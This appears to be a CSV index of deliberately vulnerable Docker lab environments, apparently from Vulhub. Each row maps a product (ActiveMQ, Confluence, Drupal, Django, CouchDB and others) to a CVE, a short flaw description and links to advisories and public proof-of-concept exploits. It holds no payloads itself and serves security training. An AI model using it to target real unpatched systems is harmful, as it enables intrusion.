Name,CVE,Description,References,Path,Type,Startup,Vector
activemq,CVE-2022-41678,Apache ActiveMQ Jolokia Authenticated Remote Code Execution (CVE-2022-41678),"https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt
https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/
http://localhost
http://your-ip:8161
http://localhost:8161",https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2022-41678,docker-compose,docker compose up,remote
activemq,CVE-2016-3088,ActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088),,https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088,docker-compose,docker compose up,remote
activemq,CVE-2023-46604,Apache ActiveMQ OpenWire Protocol Deserialization RCE (CVE-2023-46604),"https://activemq.apache.org/news/cve-2023-46604
https://xz.aliyun.com/t/12929
https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/
https://forum.butian.net/share/2566
http://ip",https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2023-46604,docker-compose,docker compose up,remote
activemq,CVE-2015-5254,ActiveMQ Deserialization Vulnerability (CVE-2015-5254),https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf,https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2015-5254,docker-compose,docker compose up,remote
adminer,CVE-2021-21311,Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311),"https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6
https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml",https://github.com/vulhub/vulhub/tree/master/adminer/CVE-2021-21311,docker-compose,docker compose up,remote
adminer,CVE-2021-43008,Adminer Remote Arbitrary File Read (CVE-2021-43008),"https://github.com/p0dalirius/CVE-2021-43008-AdminerRead
http://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability",https://github.com/vulhub/vulhub/tree/master/adminer/CVE-2021-43008,docker-compose,docker compose up,remote
airflow,CVE-2020-17526,Apache Airflow Authentication Bypass (CVE-2020-17526),"https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0
https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise
http://localhost:8080/admin/airflow/login",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-17526,docker-compose,docker compose up,remote
airflow,CVE-2020-11981,Apache Airflow Celery Broker Remote Command Execution (CVE-2020-11981),"https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
https://github.com/apache/airflow/pull/9178",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11981,docker-compose,docker compose up,remote
airflow,CVE-2020-11978,Apache Airflow Command Injection in Example Dag (CVE-2020-11978),"https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx
https://github.com/pberba/CVE-2020-11978",https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11978,docker-compose,docker compose up,remote
aj-report,Unknown,AJ-Report Authentication Bypass and Remote Code Execution (CNVD-2024-15077),"https://xz.aliyun.com/t/14460
https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md",unknown,docker-compose,docker compose up,remote
apache-cxf,CVE-2024-28752,Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752),"https://github.com/advisories/GHSA-qmgx-j96g-4428
https://nvd.nist.gov/vuln/detail/CVE-2024-28752
https://github.com/ReaJason/CVE-2024-28752",https://github.com/vulhub/vulhub/tree/master/apache-cxf/CVE-2024-28752,docker-compose,docker compose up,remote
apache-druid,CVE-2021-25646,Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646),"https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution
https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw",https://github.com/vulhub/vulhub/tree/master/apache-druid/CVE-2021-25646,docker-compose,docker compose up,remote
apereo-cas,Unknown,Apereo CAS 4.1 Deserialization RCE Vulnerability,"https://apereo.github.io/2016/04/08/commonsvulndisc/
http://your-ip:8080
http://your-ip:8080/cas/login",unknown,docker-compose,docker compose up,remote
apisix,CVE-2020-13945,Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945),"https://apisix.apache.org/docs/apisix/getting-started
https://github.com/apache/apisix/pull/2244
https://seclists.org/oss-sec/2020/q4/187",https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2020-13945,docker-compose,docker compose up,remote
apisix,CVE-2021-45232,Apache APISIX Dashboard Unauthenticated Access Leads to RCE (CVE-2021-45232),"https://apisix.apache.org/blog/2021/12/28/dashboard-cve-2021-45232/
https://github.com/wuppp/cve-2021-45232-exp",https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2021-45232,docker-compose,docker compose up,remote
appweb,CVE-2018-8715,AppWeb Authentication Bypass vulnerability (CVE-2018-8715),https://ssd-disclosure.com/index.php/archives/3676,https://github.com/vulhub/vulhub/tree/master/appweb/CVE-2018-8715,docker-compose,docker compose up,remote
aria2,Unknown,Aria2 Arbitrary File Write Vulnerability,"https://paper.seebug.org/120/
http://binux.github.io/yaaw/demo/
https://paper.seebug.org/120/",unknown,docker-compose,docker compose up,remote
bash,CVE-2014-6271,Bash Shellshock Remote Command Injection (CVE-2014-6271),,https://github.com/vulhub/vulhub/tree/master/bash/CVE-2014-6271,docker-compose,docker compose up,remote
cacti,CVE-2022-46169,Cacti remote_agent.php Pre-Auth Command Injection (CVE-2022-46169),"https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2022-46169,docker-compose,docker compose up,remote
cacti,CVE-2023-39361,Cacti graph_view.php SQL Injection Leads to RCE (CVE-2023-39361/CVE-2024-31459),"https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg
https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2023-39361,docker-compose,docker compose up,remote
cacti,CVE-2025-24367,Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367),"https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq
https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0
http://your-ip:8080",https://github.com/vulhub/vulhub/tree/master/cacti/CVE-2025-24367,docker-compose,docker compose up,remote
celery,Unknown,Celery <4.0 Redis unauthorized access + Pickle deserialization exploit,,unknown,docker-compose,docker compose up,remote
cgi,CVE-2016-5385,CGI Application Environment Variable Injection by HTTPoxy (CVE-2016-5385),"https://httpoxy.org
http://*.*.122.65:8888/`:",https://github.com/vulhub/vulhub/tree/master/cgi/CVE-2016-5385,docker-compose,docker compose up,remote
cmsms,CVE-2019-9053,CMS Made Simple (CMSMS) < 2.2.10 Unauthenticated SQL Injection (CVE-2019-9053),"https://www.exploit-db.com/exploits/46635
https://srcincite.io/pocs/cve-2021-26120.py.txt
https://www.exploit-db.com/exploits/46635
http://127.0.0.1",https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053,docker-compose,docker compose up,remote
cmsms,CVE-2021-26120,CMS Made Simple (CMSMS) Unauthenticated Remote Code Execution (CVE-2019-9053/CVE-2021-26120),"https://srcincite.io/pocs/cve-2021-26120.py.txt
https://www.exploit-db.com/exploits/46635
https://srcincite.io/pocs/cve-2021-26120.py.txt",https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120,docker-compose,docker compose up,remote
coldfusion,CVE-2023-29300,Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300),"https://blog.projectdiscovery.io/adobe-coldfusion-rce/
https://xz.aliyun.com/t/13413",https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2023-29300,docker-compose,docker compose up,remote
coldfusion,CVE-2023-26360,Adobe ColdFusion Local File Inclusion Leads to RCE (CVE-2023-26360),https://xz.aliyun.com/t/13392,https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2023-26360,docker-compose,docker compose up,remote
coldfusion,CVE-2017-3066,Adobe ColdFusion AMF Deserialization Remote Command Execution (CVE-2017-3066),"https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html
https://www.exploit-db.com/exploits/43993
https://github.com/codewhitesec/ColdFusionPwn",https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2017-3066,docker-compose,docker compose up,remote
coldfusion,CVE-2010-2861,Adobe ColdFusion Directory Traversal Vulnerability (CVE-2010-2861),,https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2010-2861,docker-compose,docker compose up,remote
confluence,CVE-2019-3396,Atlassian Confluence Path Traversal Leads to RCE (CVE-2019-3396),"https://paper.seebug.org/884/
https://jira.atlassian.com/browse/CONFSERVER-57974
http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396,docker-compose,docker compose up,remote
confluence,CVE-2023-22515,Atlassian Confluence Access Control Broken by Attributes Overwrite (CVE-2023-22515),"https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html
https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22515,docker-compose,docker compose up,remote
confluence,CVE-2022-26134,Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134),"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134,docker-compose,docker compose up,remote
confluence,CVE-2023-22527,Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2023-22527),"https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html
https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22527,docker-compose,docker compose up,remote
confluence,CVE-2021-26084,Atlassian Confluence Webwork Pre-Auth OGNL Injection Leads to RCE (CVE-2021-26084),"https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
https://jira.atlassian.com/browse/CONFSERVER-67940
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
https://github.com/h3v0x/CVE-2021-26084_Confluence
http://192.168.1.162:8090/template/custom/content-editor.vm",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2021-26084,docker-compose,docker compose up,remote
couchdb,CVE-2017-12636,Couchdb Arbitrary Command Execution (CVE-2017-12636),"https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
https://www.exploit-db.com/exploits/44498
http://bobao.360.cn/learning/detail/4716.html
http://vulhub:vulhub@your-ip:5984/_membership
http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd
http://vulhub:vulhub@your-ip:5984/vultest/_design/vul",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636,docker-compose,docker compose up,remote
couchdb,CVE-2017-12635,Apache Couchdb Remote Privilege Escalation (CVE-2017-12635),"https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
https://www.exploit-db.com/exploits/44498
http://bobao.360.cn/learning/detail/4716.html",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635,docker-compose,docker compose up,remote
couchdb,CVE-2022-24706,CouchDB Erlang distribution Remote Command Execution (CVE-2022-24706),"https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html
https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb
https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2022-24706,docker-compose,docker compose up,remote
craftcms,CVE-2023-41892,CraftCMS ConditionsController Pre-Auth Remote Code Execution (CVE-2023-41892),"https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
https://blog.calif.io/p/craftcms-rce
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/",https://github.com/vulhub/vulhub/tree/master/craftcms/CVE-2023-41892,docker-compose,docker compose up,remote
craftcms,CVE-2024-56145,CraftCMS registerargcargv Leads to Remote Code Execution (CVE-2024-56145),"https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9
https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms",https://github.com/vulhub/vulhub/tree/master/craftcms/CVE-2024-56145,docker-compose,docker compose up,remote
cups-browsed,CVE-2024-47177,OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177),"https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/
https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8",https://github.com/vulhub/vulhub/tree/master/cups-browsed/CVE-2024-47177,docker-compose,docker compose up,remote
discuz,Unknown,Discuz!X ≤3.4 Arbitrary File Deletion,https://lorexxar.cn/2017/09/30/dz-delete/,unknown,docker-compose,docker compose up,remote
discuz,Unknown,Discuz 7.x/6.x Remote Code Execution via Global Variable Override,https://www.secpulse.com/archives/2338.html,unknown,docker-compose,docker compose up,remote
django,CVE-2021-35042,Django QuerySet.order_by() SQL Injection (CVE-2021-35042),https://www.djangoproject.com/weblog/2021/jul/01/security-releases/,https://github.com/vulhub/vulhub/tree/master/django/CVE-2021-35042,docker-compose,docker compose up,remote
django,CVE-2019-14234,Django JSONField/HStoreField SQL Injection (CVE-2019-14234),"https://www.djangoproject.com/weblog/2019/aug/01/security-releases/
https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html",https://github.com/vulhub/vulhub/tree/master/django/CVE-2019-14234,docker-compose,docker compose up,remote
django,CVE-2022-34265,Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265),"https://www.djangoproject.com/weblog/2022/jul/04/security-releases/
https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492",https://github.com/vulhub/vulhub/tree/master/django/CVE-2022-34265,docker-compose,docker compose up,remote
django,CVE-2017-12794,Django 500 Debug Page Cross-Site Scripting (XSS) (CVE-2017-12794),"https://www.djangoproject.com/weblog/2017/sep/05/security-releases/
https://nvd.nist.gov/vuln/detail/CVE-2017-12794
https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html
https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html",https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794,docker-compose,docker compose up,remote
django,CVE-2020-9402,Django GIS functions and aggregates on Oracle SQL Injection (CVE-2020-9402),https://www.djangoproject.com/weblog/2020/mar/04/security-releases/,https://github.com/vulhub/vulhub/tree/master/django/CVE-2020-9402,docker-compose,docker compose up,remote
django,CVE-2018-14574,Django < 2.0.8 Open Redirect in CommonMiddleware (CVE-2018-14574),"https://www.djangoproject.com/weblog/2018/aug/01/security-releases/
https://nvd.nist.gov/vuln/detail/CVE-2018-14574",https://github.com/vulhub/vulhub/tree/master/django/CVE-2018-14574,docker-compose,docker compose up,remote
dns,Unknown,DNS Zone Transfers (AXFR),"https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
https://nmap.org/nsedoc/scripts/dns-zone-transfer.html",unknown,docker-compose,docker compose up,remote
docker,Unknown,Docker Remote API Unauthorized Access Leads to Remote Code Execution,"https://docs.docker.com/engine/security/protect-access/
https://tttang.com/archive/357/",unknown,docker-compose,docker compose up,remote
drupal,CVE-2018-7600,Drupal Drupalgeddon 2 Unauthenticated Remote Code Execution (CVE-2018-7600),"https://www.drupal.org/sa-core-2018-002
https://research.checkpoint.com/uncovering-drupalgeddon-2/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600,docker-compose,docker compose up,remote
drupal,CVE-2019-6341,Drupal Cross-Site Scripting by File Upload (CVE-2019-6341),"https://www.drupal.org/sa-core-2019-004
https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
https://paper.seebug.org/897/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6341,docker-compose,docker compose up,remote
drupal,CVE-2019-6339,Drupal Remote Code Execution by phar deserialization (CVE-2019-6339),"https://www.drupal.org/sa-core-2019-002
https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
https://paper.seebug.org/897/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6339,docker-compose,docker compose up,remote
drupal,CVE-2017-6920,Drupal Core 8 PECL YAML Deserialization Remote Code Execution (CVE-2017-6920),"https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple
https://paper.seebug.org/334/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2017-6920,docker-compose,docker compose up,remote
drupal,CVE-2014-3704,"Drupal < 7.32 ""Drupalgeddon"" SQL Injection (CVE-2014-3704)","https://www.drupal.org/SA-CORE-2014-005
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2014-3704,docker-compose,docker compose up,remote
drupal,CVE-2018-7602,Drupal Drupalgeddon 3 Authenticated Remote Code Execution (CVE-2018-7602),"https://www.drupal.org/sa-core-2018-004
https://github.com/pimps/CVE-2018-7600
https://github.com/kastellanos/CVE-2018-7602
http://127.0.0.1:8080/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7602,docker-compose,docker compose up,remote
dubbo,CVE-2019-17564,Aapche Dubbo Unsafe Java Deserialization (CVE-2019-17564),"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html
https://www.anquanke.com/post/id/198747
https://paper.seebug.org/1128/
http://your-ip:8080/org.vulhub.api.CalcService",https://github.com/vulhub/vulhub/tree/master/dubbo/CVE-2019-17564,docker-compose,docker compose up,remote
ecshop,Unknown,ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability,https://paper.seebug.org/691/,unknown,docker-compose,docker compose up,remote
ecshop,Unknown,ECShop 4.x collection_list SQL Injection,"https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw
http://foreversong.cn/archives/1556",unknown,docker-compose,docker compose up,remote
elasticsearch,CVE-2014-3120,ElasticSearch Remote Code Execution (CVE-2014-3120),"https://bou.ke/blog/elasticsearch-rce/
https://www.exploit-db.com/exploits/33370",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120,docker-compose,docker compose up,remote
elasticsearch,CVE-2015-3337,ElasticSearch Plug-in Directory Traversal (CVE-2015-3337),"https://nvd.nist.gov/vuln/detail/CVE-2015-3337
https://github.com/elastic/elasticsearch/issues/10828
https://github.com/mobz/elasticsearch-head",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-3337,docker-compose,docker compose up,remote
elasticsearch,CVE-2015-5531,ElasticSearch Snapshot and Restore Directory Traversal (CVE-2015-5531),"https://www.exploit-db.com/exploits/38383/
http://www.freebuf.com/vuls/99942.html",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531,docker-compose,docker compose up,remote
elasticsearch,CVE-2015-1427,ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427),"http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
https://github.com/XiphosResearch/exploits
http://cb.drops.wiki/drops/papers-5107.html
http://cb.drops.wiki/drops/papers-5142.html",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427,docker-compose,docker compose up,remote
elasticsearch,Unknown,ElasticSearch Arbitrary File Upload (WooYun-2015-110216),"http://cb.drops.wiki/bugs/wooyun-2015-0110216.html
http://127.0.0.1:9200/yz.jsp/yz.jsp/1",unknown,docker-compose,docker compose up,remote
electron,CVE-2018-15685,Electron WebPreferences Remote Code Execution Vulnerability（CVE-2018-15685）,"https://electronjs.org/blog/web-preferences-fix
https://www.contrastsecurity.com/security-influencers/cve-2018-15685",https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-15685,docker-compose,docker compose up,remote
